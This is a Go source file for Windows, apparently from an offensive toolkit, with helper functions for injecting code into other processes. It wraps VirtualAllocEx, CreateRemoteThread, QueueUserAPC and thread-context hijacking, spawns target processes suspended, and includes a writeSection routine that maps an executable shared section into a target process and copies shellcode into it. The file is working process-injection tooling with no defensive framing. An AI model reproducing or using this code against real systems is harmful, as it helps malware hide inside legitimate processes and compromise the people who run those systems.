//go:build windows

package technique

import (
	"fmt"
	"path/filepath"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// ─── Constants ───────────────────────────────────────────────────────────────

const (
	SECTION_ALL_ACCESS     = 0x000F001F
	SEC_COMMIT             = 0x08000000
	PAGE_EXECUTE_READWRITE = 0x40
	PAGE_EXECUTE_READ      = 0x20
	PAGE_READWRITE         = 0x04
	MEM_COMMIT             = 0x00001000
	MEM_RESERVE            = 0x00002000
	CONTEXT_AMD64          = 0x00100000
	CONTEXT_CONTROL        = CONTEXT_AMD64 | 0x00000001
	CONTEXT_INTEGER        = CONTEXT_AMD64 | 0x00000002
	CONTEXT_FULL           = CONTEXT_CONTROL | CONTEXT_INTEGER | 0x00000010
	THREAD_ALL_ACCESS      = 0x001FFFFF
	PROCESS_ALL_ACCESS     = 0x001FFFFF
	VIEW_SHARE             = 1
	TH32CS_SNAPTHREAD      = 0x00000004
	TH32CS_SNAPMODULE      = 0x00000008
)

// ─── Lazy-loaded procs ───────────────────────────────────────────────────────

var (
	ntdll   = windows.NewLazySystemDLL("ntdll.dll")
	kernel32 = windows.NewLazySystemDLL("kernel32.dll")

	// ntdll
	procNtCreateSection      = ntdll.NewProc("NtCreateSection")
	procNtMapViewOfSection   = ntdll.NewProc("NtMapViewOfSection")
	procNtUnmapViewOfSection = ntdll.NewProc("NtUnmapViewOfSection")
	procNtClose              = ntdll.NewProc("NtClose")
	procNtAlertThread        = ntdll.NewProc("NtAlertThread")

	// kernel32
	procGetThreadContext   = kernel32.NewProc("GetThreadContext")
	procSetThreadContext   = kernel32.NewProc("SetThreadContext")
	procVirtualAllocEx    = kernel32.NewProc("VirtualAllocEx")
	procVirtualFreeEx     = kernel32.NewProc("VirtualFreeEx")
	procVirtualProtectEx  = kernel32.NewProc("VirtualProtectEx")
	procCreateRemoteThread = kernel32.NewProc("CreateRemoteThread")
	procQueueUserAPC      = kernel32.NewProc("QueueUserAPC")
	procOpenThread        = kernel32.NewProc("OpenThread")
	procSuspendThread     = kernel32.NewProc("SuspendThread")
	procThread32First     = kernel32.NewProc("Thread32First")
	procThread32Next      = kernel32.NewProc("Thread32Next")
	procModule32First     = kernel32.NewProc("Module32FirstW")
	procModule32Next      = kernel32.NewProc("Module32NextW")
)

// ─── Structs ──────────────────────────────────────────────────────────────────

type THREADENTRY32 struct {
	DwSize             uint32
	CntUsage           uint32
	Th32ThreadID       uint32
	Th32OwnerProcessID uint32
	TpBasePri          int32
	TpDeltaPri         int32
	DwFlags            uint32
}

type MODULEENTRY32W struct {
	DwSize        uint32
	Th32ModuleID  uint32
	Th32ProcessID uint32
	GlblcntUsage  uint32
	ProccntUsage  uint32
	ModBaseAddr   uintptr
	ModBaseSize   uint32
	HModule       uintptr
	SzModule      [256]uint16
	SzExePath     [260]uint16
}

// ─── Helper wrappers ─────────────────────────────────────────────────────────

func virtualAllocEx(process windows.Handle, addr, size uintptr, allocType, protect uint32) (uintptr, error) {
	r1, _, err := procVirtualAllocEx.Call(
		uintptr(process), addr, size,
		uintptr(allocType), uintptr(protect),
	)
	if r1 == 0 {
		return 0, fmt.Errorf("VirtualAllocEx: %w", err)
	}
	return r1, nil
}

func virtualFreeEx(process windows.Handle, addr uintptr) {
	procVirtualFreeEx.Call(uintptr(process), addr, 0, uintptr(windows.MEM_RELEASE))
}

func virtualProtectEx(process windows.Handle, addr, size uintptr, newProtect uint32) (uint32, error) {
	var old uint32
	r1, _, err := procVirtualProtectEx.Call(
		uintptr(process), addr, size,
		uintptr(newProtect), uintptr(unsafe.Pointer(&old)),
	)
	if r1 == 0 {
		return 0, fmt.Errorf("VirtualProtectEx: %w", err)
	}
	return old, nil
}

func createRemoteThread(process windows.Handle, startAddr, param uintptr) (windows.Handle, uint32, error) {
	var tid uint32
	r1, _, err := procCreateRemoteThread.Call(
		uintptr(process),
		0, 0,
		startAddr,
		param,
		0,
		uintptr(unsafe.Pointer(&tid)),
	)
	if r1 == 0 {
		return 0, 0, fmt.Errorf("CreateRemoteThread: %w", err)
	}
	return windows.Handle(r1), tid, nil
}

func openThread(access uint32, tid uint32) (windows.Handle, error) {
	r1, _, err := procOpenThread.Call(uintptr(access), 0, uintptr(tid))
	if r1 == 0 {
		return 0, fmt.Errorf("OpenThread: %w", err)
	}
	return windows.Handle(r1), nil
}

func suspendThread(thread windows.Handle) error {
	r1, _, err := procSuspendThread.Call(uintptr(thread))
	if r1 == ^uintptr(0) { // -1 == error
		return fmt.Errorf("SuspendThread: %w", err)
	}
	return nil
}

// getThreadContext returns an alignedContext whose buf field must remain reachable
// until setThreadContext is called. Callers use ac.ctx for field access.
func getThreadContext(thread windows.Handle) (*alignedContext, error) {
	ac := newAlignedContext()
	ac.ctx.SetFlags(CONTEXT_FULL)
	r1, _, err := procGetThreadContext.Call(
		uintptr(thread),
		uintptr(unsafe.Pointer(ac.ctx)),
	)
	if r1 == 0 {
		return nil, fmt.Errorf("GetThreadContext: %w", err)
	}
	return ac, nil
}

func setThreadContext(thread windows.Handle, ac *alignedContext) error {
	r1, _, err := procSetThreadContext.Call(
		uintptr(thread),
		uintptr(unsafe.Pointer(ac.ctx)),
	)
	if r1 == 0 {
		return fmt.Errorf("SetThreadContext: %w", err)
	}
	return nil
}

// findThreadInProcess returns the first thread ID owned by the given PID.
func findThreadInProcess(pid uint32) (uint32, error) {
	snap, err := windows.CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)
	if err != nil {
		return 0, fmt.Errorf("CreateToolhelp32Snapshot: %w", err)
	}
	defer windows.CloseHandle(snap)

	var entry THREADENTRY32
	entry.DwSize = uint32(unsafe.Sizeof(entry))

	r1, _, err := procThread32First.Call(uintptr(snap), uintptr(unsafe.Pointer(&entry)))
	if r1 == 0 {
		return 0, fmt.Errorf("Thread32First: %w", err)
	}
	for {
		if entry.Th32OwnerProcessID == pid {
			return entry.Th32ThreadID, nil
		}
		entry.DwSize = uint32(unsafe.Sizeof(entry))
		r1, _, _ = procThread32Next.Call(uintptr(snap), uintptr(unsafe.Pointer(&entry)))
		if r1 == 0 {
			break
		}
	}
	return 0, fmt.Errorf("no thread found for PID %d", pid)
}

// findModuleInProcess returns the base address and size of the first non-main module
// loaded in the target process (skips index 0 which is the main EXE).
func findModuleInProcess(pid uint32) (base uintptr, size uint32, name string, err error) {
	snap, err2 := windows.CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid)
	if err2 != nil {
		return 0, 0, "", fmt.Errorf("CreateToolhelp32Snapshot(modules): %w", err2)
	}
	defer windows.CloseHandle(snap)

	var entry MODULEENTRY32W
	entry.DwSize = uint32(unsafe.Sizeof(entry))

	r1, _, e := procModule32First.Call(uintptr(snap), uintptr(unsafe.Pointer(&entry)))
	if r1 == 0 {
		return 0, 0, "", fmt.Errorf("Module32First: %w", e)
	}

	// Skip first (main exe), return second (first loaded DLL)
	entry.DwSize = uint32(unsafe.Sizeof(entry))
	r1, _, e = procModule32Next.Call(uintptr(snap), uintptr(unsafe.Pointer(&entry)))
	if r1 == 0 {
		return 0, 0, "", fmt.Errorf("Module32Next: %w", e)
	}

	modName := syscall.UTF16ToString(entry.SzModule[:])
	return entry.ModBaseAddr, entry.ModBaseSize, modName, nil
}

// spawnProcess starts a process and returns its info.
func spawnProcess(target string, suspended bool) (windows.ProcessInformation, error) {
	path, err := resolveExecutable(target)
	if err != nil {
		return windows.ProcessInformation{}, err
	}

	var si windows.StartupInfo
	var pi windows.ProcessInformation
	si.Cb = uint32(unsafe.Sizeof(si))

	flags := uint32(0)
	if suspended {
		flags = windows.CREATE_SUSPENDED
	}

	pathPtr, _ := windows.UTF16PtrFromString(path)
	if err := windows.CreateProcess(nil, pathPtr, nil, nil, false, flags, nil, nil, &si, &pi); err != nil {
		return windows.ProcessInformation{}, fmt.Errorf("CreateProcess(%s): %w", path, err)
	}
	return pi, nil
}

// writeSection creates an anonymous pagefile-backed section, maps it into both
// the current process and the target process, copies shellcode via the local mapping,
// and returns the remote address. Caller is responsible for unmapping local.
func writeSection(targetProcess windows.Handle, shellcode []byte) (localAddr, remoteAddr uintptr, sectionHandle windows.Handle, err error) {
	shellcodeSize := uintptr(len(shellcode))
	maxSize := int64(shellcodeSize)

	ntstatus, _, _ := procNtCreateSection.Call(
		uintptr(unsafe.Pointer(&sectionHandle)),
		SECTION_ALL_ACCESS,
		0,
		uintptr(unsafe.Pointer(&maxSize)),
		PAGE_EXECUTE_READWRITE,
		SEC_COMMIT,
		0,
	)
	if ntstatus != 0 {
		return 0, 0, 0, fmt.Errorf("NtCreateSection: 0x%x", ntstatus)
	}

	viewSize := shellcodeSize
	ntstatus, _, _ = procNtMapViewOfSection.Call(
		uintptr(sectionHandle),
		uintptr(windows.CurrentProcess()),
		uintptr(unsafe.Pointer(&localAddr)),
		0, 0, 0,
		uintptr(unsafe.Pointer(&viewSize)),
		VIEW_SHARE, 0,
		PAGE_EXECUTE_READWRITE,
	)
	if ntstatus != 0 {
		procNtClose.Call(uintptr(sectionHandle))
		return 0, 0, 0, fmt.Errorf("NtMapViewOfSection (local): 0x%x", ntstatus)
	}

	// Copy shellcode into local mapping
	dst := (*[1 << 30]byte)(unsafe.Pointer(localAddr))[:shellcodeSize:shellcodeSize]
	copy(dst, shellcode)

	viewSize = shellcodeSize
	ntstatus, _, _ = procNtMapViewOfSection.Call(
		uintptr(sectionHandle),
		uintptr(targetProcess),
		uintptr(unsafe.Pointer(&remoteAddr)),
		0, 0, 0,
		uintptr(unsafe.Pointer(&viewSize)),
		VIEW_SHARE, 0,
		PAGE_EXECUTE_READ,
	)
	if ntstatus != 0 {
		procNtUnmapViewOfSection.Call(uintptr(windows.CurrentProcess()), localAddr)
		procNtClose.Call(uintptr(sectionHandle))
		return 0, 0, 0, fmt.Errorf("NtMapViewOfSection (remote): 0x%x", ntstatus)
	}

	return localAddr, remoteAddr, sectionHandle, nil
}

func resolveExecutable(name string) (string, error) {
	if filepath.IsAbs(name) {
		return name, nil
	}
	sysDir, err := windows.GetSystemDirectory()
	if err == nil {
		candidate := filepath.Join(sysDir, name)
		p, _ := windows.UTF16PtrFromString(candidate)
		if _, err2 := windows.GetFileAttributes(p); err2 == nil {
			return candidate, nil
		}
	}
	return name, nil
}

func sleepMS(ms int) {
	time.Sleep(time.Duration(ms) * time.Millisecond)
}
